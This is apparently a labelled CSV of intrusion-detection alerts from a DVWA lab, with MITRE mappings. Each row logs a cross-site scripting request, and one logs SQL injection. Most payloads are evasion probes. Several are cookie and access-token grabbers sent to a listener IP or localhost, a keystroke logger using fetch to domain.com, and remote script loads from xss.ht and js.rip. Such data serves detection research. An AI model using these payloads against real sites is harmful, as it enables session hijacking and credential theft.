timestamp,rule_id,rule_level,data_id,MITRE_ID,MITRE_Tactic,srcip,dstip,full_log,data_protocol,data_url,label
2025-03-31T20:58:13.508+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:01:52 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3CforeignObject%3E%3C!%5BCDATA%5B%3C/foreignObject%3E%3Cscript%3Ealert(2)%3C/script%3E%5D%5D%3E%3C/svg%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3CforeignObject%3E%3C!%5BCDATA%5B%3C/foreignObject%3E%3Cscript%3Ealert(2)%3C/script%3E%5D%5D%3E%3C/svg%3E,1
2025-03-31T20:58:20.016+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:01:57 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Ctitle%3E%3C!%5BCDATA%5B%3C/title%3E%3Cscript%3Ealert(3)%3C/script%3E%5D%5D%3E%3C/svg%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Ctitle%3E%3C!%5BCDATA%5B%3C/title%3E%3Cscript%3Ealert(3)%3C/script%3E%5D%5D%3E%3C/svg%3E,1
2025-03-31T20:59:03.404+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:02:37 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Chtml%3E%20%3Cbody%3E%20%20%20%20%20%3Cinput%20type=button%20value=%22Click%20Me%22%20id=%22btn%22%3E%20%3C/body%3E%20%20%3Cscript%3E%20document.getElementById('btn').onclick%20=%20function(e)%7B%20%20%20%20%20window.poc%20=%20window.open('http://www.redacted.com/ HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Chtml%3E%20%3Cbody%3E%20%20%20%20%20%3Cinput%20type=button%20value=%22Click%20Me%22%20id=%22btn%22%3E%20%3C/body%3E%20%20%3Cscript%3E%20document.getElementById('btn').onclick%20=%20function(e)%7B%20%20%20%20%20window.poc%20=%20window.open('http://www.redacted.com/,1
2025-03-31T20:59:07.744+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:02:42 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%20src=%22https://js.rip/%3Ccustom.name%3E%22%3E%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%20src=%22https://js.rip/%3Ccustom.name%3E%22%3E%3C/script%3E,1
2025-03-31T20:59:14.252+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:02:48 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%20src=//%3Ccustom.subdomain%3E.xss.ht%3E%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%20src=//%3Ccustom.subdomain%3E.xss.ht%3E%3C/script%3E,1
2025-03-31T20:59:18.593+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:02:53 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3E$.getScript(%22//%3Ccustom.subdomain%3E.xss.ht%22)%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3E$.getScript(%22//%3Ccustom.subdomain%3E.xss.ht%22)%3C/script%3E,1
2025-03-31T20:59:25.100+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:02:58 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain%3C/script%3E,1
2025-03-31T20:59:29.438+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:03:03 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cnoscript%3E%3Cp%20title=%22%3C/noscript%3E%3Cimg%20src=x%20onerror=alert(1)%3E%22%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cnoscript%3E%3Cp%20title=%22%3C/noscript%3E%3Cimg%20src=x%20onerror=alert(1)%3E%22%3E,1
2025-03-31T21:11:10.112+0700,31164,6,200,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:13:49 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%27+a+or+1%3D1&Submit=Submit HTTP/1.1"" 200 509 ""http://192.168.88.134/DVWA/vulnerabilities/sqli/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/sqli/?id=%27+a+or+1%3D1&Submit=Submit,1
2025-03-31T21:11:25.296+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:02 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://localhost/XSS/grabber.php?c='+document.cookie%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://localhost/XSS/grabber.php?c='+document.cookie%3C/script%3E,1
2025-03-31T21:11:29.634+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:07 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')%3C/script%3E,1
2025-03-31T21:11:36.141+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:12 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Enew%20Image().src=%22http://localhost/cookie.php?c=%22+document.cookie;%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Enew%20Image().src=%22http://localhost/cookie.php?c=%22+document.cookie;%3C/script%3E,1
2025-03-31T21:11:40.482+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:17 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Enew%20Image().src=%22http://localhost/cookie.php?c=%22+localStorage.getItem('access_token');%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Enew%20Image().src=%22http://localhost/cookie.php?c=%22+localStorage.getItem('access_token');%3C/script%3E,1
2025-03-31T21:11:46.986+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:22 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror='document.onkeypress=function(e)%7Bfetch(%22http://domain.com?k=%22+String.fromCharCode(e.which))%7D,this.remove();'%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror='document.onkeypress=function(e)%7Bfetch(%22http://domain.com?k=%22+String.fromCharCode(e.which))%7D,this.remove();'%3E",1
2025-03-31T21:11:51.320+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:27 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edebugger;%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edebugger;%3C/script%3E,1
2025-03-31T21:11:57.823+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:32 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.domain.concat(%22%5Cn%22).concat(window.origin))%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.domain.concat(%22%5Cn%22).concat(window.origin))%3C/script%3E,1
2025-03-31T21:12:02.164+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:37 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Econsole.log(%22Test%20XSS%20from%20the%20search%20bar%20of%20page%20XYZ%5Cn%22.concat(document.domain).concat(%22%5Cn%22).concat(window.origin))%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Econsole.log(%22Test%20XSS%20from%20the%20search%20bar%20of%20page%20XYZ%5Cn%22.concat(document.domain).concat(%22%5Cn%22).concat(window.origin))%3C/script%3E,1
2025-03-31T21:12:08.664+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:42 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert('XSS')%3C/script%3E,1
2025-03-31T21:12:13.003+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:47 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C/scr%3Cscript%3Eipt%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C/scr%3Cscript%3Eipt%3E,1
2025-03-31T21:12:23.841+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:14:57 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E",1
2025-03-31T21:12:30.349+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:02 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3E%5Cu0061lert('22')%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3E%5Cu0061lert('22')%3C/script%3E,1
2025-03-31T21:12:34.690+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:07 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Eeval('%5Cx61lert(%5C'33%5C')')%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Eeval('%5Cx61lert(%5C'33%5C')')%3C/script%3E,1
2025-03-31T21:12:41.195+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:13 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Eeval(8680439..toString(30))(983801..toString(36))%3C/script%3E%20//parseInt(%22confirm%22,30)%20==%208680439%20&&%208680439..toString(30)%20==%20%22confirm%22 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Eeval(8680439..toString(30))(983801..toString(36))%3C/script%3E%20//parseInt(%22confirm%22,30)%20==%208680439%20&&%208680439..toString(30)%20==%20%22confirm%22",1
2025-03-31T21:12:52.038+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:23 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert('XSS');%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert('XSS');%3E,1
2025-03-31T21:12:56.378+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:28 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert('XSS')// HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert('XSS')//,1
2025-03-31T21:13:02.883+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:33 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert(String.fromCharCode(88,83,83));%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert(String.fromCharCode(88,83,83));%3E",1
2025-03-31T21:13:07.224+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:38 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20oneonerrorrror=alert(String.fromCharCode(88,83,83));%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20oneonerrorrror=alert(String.fromCharCode(88,83,83));%3E",1
2025-03-31T21:13:13.733+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:43 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x:alert(alt)%20onerror=eval(src)%20alt=xss%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x:alert(alt)%20onerror=eval(src)%20alt=xss%3E,1
2025-03-31T21:13:18.069+0700,31154,10,302,T1059,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:48 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cimg%20src=x%20onerror=alert('XSS');%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cimg%20src=x%20onerror=alert('XSS');%3E,1
2025-03-31T21:13:24.578+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:53 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cimg%20src=x%20onerror=alert(String.fromCharCode(88,83,83));%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cimg%20src=x%20onerror=alert(String.fromCharCode(88,83,83));%3E",1
2025-03-31T21:13:28.917+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:15:58 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3C%3E%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3C%3E%3Cimg%20src=1%20onerror=alert(1)%3E,1
2025-03-31T21:13:35.423+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:16:03 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%20onload=alert(1)%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%20onload=alert(1)%3E,1
2025-03-31T21:13:46.271+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:16:13 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%20onload=alert(1)// HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%20onload=alert(1)//,1
2025-03-31T21:13:57.114+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:16:23 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%20id=alert(1)%20onload=eval(id)%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%20id=alert(1)%20onload=eval(id)%3E,1
2025-03-31T21:14:12.310+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:16:38 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%20href=data:,alert(1)%20/%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%20href=data:,alert(1)%20/%3E",1
2025-03-31T21:14:18.817+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:16:43 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%3Ealert('33') HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%3Ealert('33'),1
2025-03-31T21:14:23.157+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:16:48 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%3Ealert&lpar;'33'&rpar; HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%3Ealert&lpar;'33'&rpar;,1
2025-03-31T21:15:06.533+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:17:28 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cbody%20onload=alert(/XSS/.source)%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cbody%20onload=alert(/XSS/.source)%3E,1
2025-03-31T21:15:13.042+0700,31154,10,302,T1059,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:17:33 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cinput%20autofocus%20onfocus=alert(1)%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cinput%20autofocus%20onfocus=alert(1)%3E,1
2025-03-31T21:16:35.499+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:18:48 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cinput%20type=%22hidden%22%20oncontentvisibilityautostatechange=%22alert(1)%22%20%20style=%22content-visibility:auto%22%20%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cinput%20type=%22hidden%22%20oncontentvisibilityautostatechange=%22alert(1)%22%20%20style=%22content-visibility:auto%22%20%3E,1
2025-03-31T21:16:39.838+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:18:53 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3CIMG%20SRC=1%20ONERROR=& HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3CIMG%20SRC=1%20ONERROR=&,1
